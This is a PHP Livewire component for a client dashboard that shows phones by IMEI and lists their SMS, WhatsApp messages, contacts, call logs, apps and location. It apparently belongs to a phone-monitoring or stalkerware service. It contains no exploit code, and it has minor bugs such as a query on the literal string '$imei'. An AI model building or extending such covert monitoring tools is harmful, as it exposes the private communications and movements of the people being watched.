<?php

namespace App\Http\Livewire\Client;

use Livewire\Component;
use Auth;
use App\Models\Browser;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Facebook;
use App\Models\Phone;
use App\Models\Simcard;
use App\Models\Sms;
use App\Models\SocialApp;
use App\Models\App;
use App\Models\Whatsapp;

class Home extends Component
{
    public $phoneImei;

    public $whatsapp = false;
    public $sms = false;
    public $home = false;
    // data
    public $smsList = [];
    public $appsList = [];
    public $contactList = [];
    public $callLogList = [];
    public $deviceList = [];
    public $locationList = [];
    public $whatsappList = [];

    public function showWhatsapp($imei) {
        $this->resetChoice();
        $this->whatsappList = SocialApp::where(['imei'=>$imei,'platform'=>'whatsapp'])->orderBy('date','asc')->get();
        $this->whatsapp = true;


    }
    public function showSms($imei) {
        $this->resetChoice();
        $this->sms = true;
        $this->smsList = Sms::where('imei',$imei)->get();
    }
    public function showTwitter($imei) {
        $this->resetChoice();
        $this->twitter = true;
    }
    public function showContacts($imei) {
        $this->resetChoice();
        $this->contacts = true;
        $this->contactList = Contact::where('imei',$imei)->get();
    }
    public function showCallLogs($imei) {
        $this->resetChoice();
        $this->callLogs = true;
        $this->callLogList = ContactLog::where('imei',$imei)->get();
    }
    public function showDashboard($imei) {
        // get all regquired adat from db
        $this->resetChoice();
        $this->dashboard = true;
    }
    public function showApps($imei) {
        $this->resetChoice();
        $this->apps = true;
        $this->appsList = App::where('imei','$imei')->get();
    }
    public function showLocation($imei) {
        $this->resetChoice();
        $this->location = true;
    }


    private function resetChoice() {
        $this->sms = false;
        $this->dashboard = false;
        $this->apps = false;
        $this->callLogs = false;
        $this->whatsapp = false;
        $this->facebook = false;
        $this->instagram = false;
        $this->twitter = false;
        $this->telegram = false;
        $this->chrome = false;
        $this->brave = false;
        $this->tor = false;
        $this->phoenix = false;
        $this->ducduckgo = false;

        //reset data entry
        $this->reset(['smsList','appsList','contactList','callLogList','deviceList','locationList','whatsappList']);
    }

    public function render()
    {
        if($this->sms){
            return view('livewire.client.sms.index',[
                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
            ]);
        }elseif($this->whatsapp){
            return view('livewire.client.whatsapp.index',[
                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
            ]);
        }else{
            return view('livewire.client.home',[
                'phones' => \App\Models\Phone::where('mobile_access_token',Auth::user()->mobile_access_token)->get(),
            ]);
        }

    }
}
